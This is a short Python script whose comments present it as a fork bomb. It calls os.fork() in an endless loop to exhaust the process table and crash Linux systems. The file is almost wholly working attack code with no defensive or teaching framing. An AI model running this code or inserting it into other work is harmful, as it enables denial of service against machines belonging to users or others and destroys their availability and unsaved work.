import os

# A simple python script to execute a forkbomb.
# Works by consuming CPU time and saturating the process table with
# forking, in an infinite loop, until the system crashes
# NOTE: only works on linux systems, as windows does not have a fork operation
while True:
    os.fork()